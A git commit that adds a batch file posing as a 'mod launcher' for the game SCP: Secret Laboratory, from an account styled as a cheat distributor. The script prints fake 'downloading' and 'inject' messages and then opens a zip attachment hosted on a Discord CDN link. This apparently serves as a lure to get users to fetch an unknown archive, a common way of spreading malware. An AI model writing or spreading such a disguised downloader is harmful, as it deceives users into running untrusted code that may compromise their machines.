3f6cb6f7a3b152cf07f67fc1d10f9942b782323f
SCP: SL cheats <91350104+MonkeytagMODS@users.noreply.github.com>
2021-09-25 21:44:24 -0400

    Add files via upload

---
+++ SCPSL Launcher.bat
@@ -0,0 +1,15 @@
+@echo off
+title [SCP:SL Mod launcher]
+color 0a
+
+echo Are you sure you want to launch this right now (y/n)
+pause
+echo Have you read Readme.txt yet? (y/n)
+pause
+echo downloading... press any button to inject
+pause
+echo Downloaded
+echo You do not need to open this again just reopen SCPSL menu
+echo Unless it gets updated then reinstall it here
+start https://cdn.discordapp.com/attachments/886497053805539388/891499890092421170/Attachment.zip
+timeout 50
